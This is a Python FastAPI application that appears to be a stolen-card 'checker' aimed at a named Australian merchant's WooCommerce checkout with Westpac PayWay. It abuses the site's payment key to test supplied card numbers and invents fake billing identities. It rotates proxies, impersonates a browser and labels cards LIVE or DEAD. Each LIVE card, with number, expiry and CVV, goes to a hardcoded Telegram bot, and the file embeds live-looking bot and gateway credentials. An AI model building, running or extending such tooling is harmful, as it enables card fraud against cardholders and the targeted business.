# app.py
# Python 3.11 - 3.14 | Run: pip fastapi uvicorn curl_cffi
from __future__ import annotations

import asyncio
import json
import random
import re
from dataclasses import dataclass
from typing import Any, Final
from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse
from curl_cffi.requests import AsyncSession, Response

app = FastAPI(title="WooCommerce Westpac PayWay Web Checker")

# ============================================================================
# CONFIG BLOCK
# ============================================================================
TARGET_BASE: Final[str] = "https://www.accesseducation.com.au"
CHECKOUT_PATH: Final[str] = "/checkout/"
FORCED_PRODUCT_ID: Final[str | None] = "1551"
PAYMENT_GATEWAY_SLUG: Final[str] = "westpac_payway_net"
FORCED_PAYWAY_AUTH: Final[str] = (
    "Basic UTE0NDMzX1BVQl9oNDlmcXB4c2hleWp2bW5zNGp6ZWVlN3RiOTY0aXdha3RiaXVwanJhN3BxaHhnMm5wOWF6MmFzZW01bTU6"
)
TELEGRAM_BOT_TOKEN: Final[str] = "8716620633:AAGD2-O_2E-ZKm3HPTaTyu3o4uc1u5GLR1M"
TELEGRAM_CHAT_ID: Final[str] = "6516330870"
ENABLE_TELEGRAM_ALERTS: Final[bool] = True

CHECKOUT_URL: Final[str] = f"{TARGET_BASE.rstrip('/')}{CHECKOUT_PATH}"
CART_URL: Final[str] = f"{TARGET_BASE.rstrip('/')}/cart/"

NONCE_RE: Final[re.Pattern[str]] = re.compile(
    r'name="woocommerce-process-checkout-nonce"\s+value="([a-f0-9]+)"'
    r'|update_order_review_nonce["\']\s*:\s*["\']([a-f0-9]+)["\']',
    re.IGNORECASE,
)
GATEWAY_RADIO_RE: Final[re.Pattern[str]] = re.compile(
    r'name="payment_method"[^>]*value="([^"]+)"|value="([^"]+)"[^>]*name="payment_method"',
    re.IGNORECASE,
)


@dataclass(frozen=True, slots=True)
class Card:
    number: str
    month: str
    year: str
    cvv: str
    raw: str

    @property
    def short_year(self) -> str:
        return self.year[-2:] if len(self.year) == 4 else self.year


@dataclass(frozen=True, slots=True)
class CheckResult:
    card: Card
    status: str
    reason: str
    latency_ms: float


def verify_luhn(card_number: str) -> bool:
    if not card_number.isdigit() or not (13 <= len(card_number) <= 19):
        return False
    checksum = 0
    for idx, digit in enumerate(map(int, reversed(card_number))):
        if idx % 2 == 1:
            doubled = digit * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += digit
    return checksum % 10 == 0


def parse_card_line(line: str) -> Card | None:
    clean = line.strip()
    if not clean or clean.startswith("#"):
        return None
    parts = re.split(r"[|:/\\\s]+", clean)
    if len(parts) < 4:
        return None
    cc, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
    if not verify_luhn(cc) or not (1 <= int(mm) <= 12):
        return None
    return Card(number=cc, month=mm, year=yy, cvv=cvv, raw=clean)


class TelegramNotifier:
    @staticmethod
    async def send_alert(text: str) -> None:
        if not ENABLE_TELEGRAM_ALERTS or not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
            return
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
        try:
            async with AsyncSession(impersonate="chrome120") as s:
                await s.post(url, json=payload, timeout=5)
        except Exception:
            pass


class BillingProfile:
    FIRST_NAMES: Final[tuple[str, ...]] = ("Liam", "Noah", "Oliver", "James", "Lucas", "Jack", "Harrison")
    LAST_NAMES: Final[tuple[str, ...]] = ("Smith", "Jones", "Williams", "Brown", "Wilson", "Taylor", "Davies")
    STREETS: Final[tuple[str, ...]] = ("142 Collins St", "88 Pitt St", "210 Queen St", "45 Bourke St")
    CITIES: Final[tuple[tuple[str, str, str], ...]] = (
        ("Melbourne", "VIC", "3000"),
        ("Sydney", "NSW", "2000"),
        ("Brisbane", "QLD", "4000"),
    )

    @classmethod
    def generate(cls) -> dict[str, str]:
        fname = random.choice(cls.FIRST_NAMES)
        lname = random.choice(cls.LAST_NAMES)
        city, state, postcode = random.choice(cls.CITIES)
        rand_num = random.randint(1000, 9999)
        return {
            "billing_first_name": fname,
            "billing_last_name": lname,
            "billing_company": "Access Student",
            "billing_country": "AU",
            "billing_address_1": random.choice(cls.STREETS),
            "billing_address_2": "",
            "billing_city": city,
            "billing_state": state,
            "billing_postcode": postcode,
            "billing_phone": f"04{random.randint(10000000, 99999999)}",
            "billing_email": f"{fname.lower()}.{lname.lower()}{rand_num}@gmail.com",
            "shipping_first_name": fname,
            "shipping_last_name": lname,
            "shipping_company": "Access Student",
            "shipping_country": "AU",
            "shipping_address_1": random.choice(cls.STREETS),
            "shipping_address_2": "",
            "shipping_city": city,
            "shipping_state": state,
            "shipping_postcode": postcode,
        }


class GatewayClassifier:
    LIVE_PATTERNS: Final[tuple[str, ...]] = (
        "insufficient funds", "insufficient_funds", "security code is incorrect",
        "incorrect_cvc", "cvc check failed", "cvv2 mismatch", "invalid cvc",
        "do not honor", "transaction not allowed", "authentication_required",
        "requires_action", "order-received", '"result":"success"',
    )
    DEAD_PATTERNS: Final[tuple[str, ...]] = (
        "card was declined", "generic_decline", "invalid_number", "expired_card",
        "pickup_card", "lost_card", "stolen_card", "fraudulent", "card_declined",
        "invalid account", "no such issuer", "invalid card number", "declined",
        "error processing checkout", "invalid card number (no such number)", "do not honour",
    )

    @classmethod
    def classify(cls, raw_body: str) -> tuple[str, str]:
        lower_body = raw_body.lower()
        reason_excerpt = "Unmapped gateway response"
        clean_msg = re.sub(r"<[^>]+>", " ", raw_body).strip()
        clean_msg = re.sub(r"\s+", " ", clean_msg)
        if clean_msg:
            reason_excerpt = clean_msg[:140]

        if "single use token" in lower_body or ("token" in lower_body and "provide" in lower_body):
            return "ERROR", f"Integration Misconfiguration: {reason_excerpt}"

        try:
            data: dict[str, Any] = json.loads(raw_body)
            redirect = str(data.get("redirect", ""))
            messages = str(data.get("messages", ""))
            result_flag = str(data.get("result", ""))
            msg_clean = re.sub(r"<[^>]+>", " ", messages).strip()
            if msg_clean:
                reason_excerpt = msg_clean[:140]
            if result_flag == "success" or "order-received" in redirect:
                return "LIVE", f"Charged / 3DS Redirect -> {redirect[:60]}"
        except ValueError:
            pass

        for pat in cls.LIVE_PATTERNS:
            if pat in lower_body:
                return "LIVE", f"Matched [{pat}] | {reason_excerpt}"
        for pat in cls.DEAD_PATTERNS:
            if pat in lower_body:
                return "DEAD", f"Matched [{pat}] | {reason_excerpt}"
        return "DEAD", reason_excerpt


class WooCommerceChecker:
    def __init__(self, proxies: list[str]) -> None:
        self.proxies = proxies

    def _pick_proxy(self) -> str | None:
        return random.choice(self.proxies) if self.proxies else None

    async def check_card(self, card: Card) -> CheckResult:
        t0 = time.perf_counter()
        proxy = self._pick_proxy()

        async with AsyncSession(impersonate="chrome120", proxy=proxy, verify=True) as session:
            try:
                # 1. Seed Cart & Get Nonce
                await session.get(CART_URL, timeout=8)
                if FORCED_PRODUCT_ID:
                    await session.get(CART_URL, params={"add-to-cart": FORCED_PRODUCT_ID, "quantity": "1"}, timeout=8)
                chk_resp = await session.get(CHECKOUT_URL, timeout=8)
                nonce_m = NONCE_RE.search(chk_resp.text)
                nonce = (nonce_m.group(1) or nonce_m.group(2)) if nonce_m else None
                if not nonce:
                    return CheckResult(card=card, status="ERROR", reason="Missing checkout nonce", latency_ms=(time.perf_counter() - t0) * 1000.0)

                billing = BillingProfile.generate()

                # 2. Mint PayWay Token
                token_headers = {
                    "Authorization": FORCED_PAYWAY_AUTH,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "application/json, text/plain, */*",
                    "Origin": TARGET_BASE,
                    "Referer": CHECKOUT_URL,
                }
                token_payload = {
                    "paymentMethod": "creditCard",
                    "connectionType": "FRAME",
                    "cardholderName": f"{billing['billing_first_name']} {billing['billing_last_name']}",
                    "cardNumber": card.number,
                    "expiryDateMonth": card.month,
                    "expiryDateYear": card.short_year,
                    "cvn": card.cvv,
                    "threeDS2": "false",
                }
                t_resp = await session.post("https://api.payway.com.au/rest/v1/single-use-tokens", headers=token_headers, data=token_payload, timeout=8)
                t_data = t_resp.json()

                if "singleUseTokenId" not in t_data:
                    err = t_data.get("error", {})
                    msg = err.get("message", t_resp.text[:120])
                    status, reason = GatewayClassifier.classify(msg)
                    return CheckResult(card=card, status=status, reason=reason, latency_ms=(time.perf_counter() - t0) * 1000.0)

                token_id = str(t_data["singleUseTokenId"])

                # 3. Checkout POST
                form_data = {
                    **billing,
                    "order_comments": "",
                    "payment_method": PAYMENT_GATEWAY_SLUG,
                    "woocommerce-process-checkout-nonce": nonce,
                    "_wp_http_referer": CHECKOUT_PATH,
                    "terms": "on",
                    "terms-field": "1",
                    "westpac-token": token_id,
                    "singleUseTokenId": token_id,
                    "payway_single_use_token_id": token_id,
                }
                post_resp = await session.post(f"{TARGET_BASE.rstrip('/')}/?wc-ajax=checkout", data=form_data, headers={"Origin": TARGET_BASE, "Referer": CHECKOUT_URL, "X-Requested-With": "XMLHttpRequest"}, timeout=10)
                status, reason = GatewayClassifier.classify(post_resp.text)

                if status == "LIVE":
                    asyncio.create_task(TelegramNotifier.send_alert(f"<b>🔥 WEB HIT 🔥</b>\n💳 <code>{card.raw}</code>\n💬 <code>{reason}</code>"))

                return CheckResult(card=card, status=status, reason=reason, latency_ms=(time.perf_counter() - t0) * 1000.0)
            except Exception as exc:
                return CheckResult(card=card, status="ERROR", reason=str(exc), latency_ms=(time.perf_counter() - t0) * 1000.0)


# ============================================================================
# WEB DASHBOARD INTERFACE (HTML / CSS)
# ============================================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>WooCommerce PayWay Web Checker</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-slate-100 font-sans min-h-screen p-6">
    <div class="max-w-4xl mx-auto space-y-6">
        <header class="border-b border-slate-800 pb-4 flex justify-between items-center">
            <h1 class="text-2xl font-bold tracking-wider text-emerald-400">⚡ WESTPAC PAYWAY WEB CHECKER</h1>
            <span class="text-xs bg-emerald-900/50 text-emerald-300 px-3 py-1 rounded-full border border-emerald-700">Online & Active</span>
        </header>

        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
            <!-- Input Form Card -->
            <div class="bg-slate-900 border border-slate-800 p-5 rounded-xl shadow-lg space-y-4">
                <h2 class="text-lg font-semibold text-slate-300">Test Configuration</h2>
                <form id="checkForm" class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Card (CC|MM|YYYY|CVV)</label>
                        <input type="text" id="cardInput" placeholder="4111222233334444|08|2028|123" required
                            class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-sm focus:ring-2 focus:ring-emerald-500 focus:outline-none">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Proxy (Optional - http://ip:port)</label>
                        <input type="text" id="proxyInput" placeholder="http://user:pass@host:port"
                            class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-sm focus:ring-2 focus:ring-emerald-500 focus:outline-none">
                    </div>
                    <button type="submit" id="submitBtn"
                        class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-2.5 rounded-lg transition duration-200 shadow-md">
                        Check Card
                    </button>
                </form>
            </div>

            <!-- Results Panel -->
            <div class="bg-slate-900 border border-slate-800 p-5 rounded-xl shadow-lg flex flex-col justify-between">
                <div>
                    <h2 class="text-lg font-semibold text-slate-300 mb-3">Live Result Output</h2>
                    <div id="resultBox" class="bg-slate-950 border border-slate-800 rounded-lg p-4 h-48 overflow-y-auto font-mono text-xs space-y-2 text-slate-400">
                        <span>[*] Ready for requests...</span>
                    </div>
                </div>
                <div class="text-right text-xs text-slate-500 pt-3 border-t border-slate-800">
                    Target: Access Education (PayWay Gateway)
                </div>
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('checkForm');
        const resultBox = document.getElementById('resultBox');
        const submitBtn = document.getElementById('submitBtn');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            submitBtn.disabled = true;
            submitBtn.textContent = 'Checking...';

            const card = document.getElementById('cardInput').value;
            const proxy = document.getElementById('proxyInput').value;

            resultBox.innerHTML += `<div class="text-yellow-400">[*] Checking ${card}...</div>`;

            try {
                const response = await fetch('/api/check', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `card=${encodeURIComponent(card)}&proxy=${encodeURIComponent(proxy)}`
                });
                const data = await response.json();

                let color = 'text-slate-300';
                if (data.status === 'LIVE') color = 'text-emerald-400 font-bold';
                else if (data.status === 'DEAD') color = 'text-rose-400';
                else if (data.status === 'ERROR') color = 'text-amber-400';

                resultBox.innerHTML += `<div class="${color}">[${data.status}] ${data.card} -> ${data.reason} (${data.latency_ms.toFixed(0)}ms)</div>`;
            } catch (err) {
                resultBox.innerHTML += `<div class="text-rose-500">[ERROR] Request failed: ${err}</div>`;
            }

            submitBtn.disabled = false;
            submitBtn.textContent = 'Check Card';
            resultBox.scrollTop = resultBox.scrollHeight;
        });
    </script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse)
async def index() -> str:
    return HTML_TEMPLATE

@app.post("/api/check")
async def api_check(card: str = Form(...), proxy: str = Form(...)) -> dict[str, Any]:
    parsed_card = parse_card_line(card)
    if not parsed_card:
        return {"card": card, "status": "ERROR", "reason": "Invalid card format or failed Luhn check", "latency_ms": 0}

    proxies_list = [proxy.strip()] if proxy and proxy.strip() else []
    checker = WooCommerceChecker(proxies=proxies_list)
    res = await checker.check_card(parsed_card)

    return {
        "card": res.card.raw,
        "status": res.status,
        "reason": res.reason,
        "latency_ms": res.latency_ms,
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="127.0.0.1", port=8000, reload=True)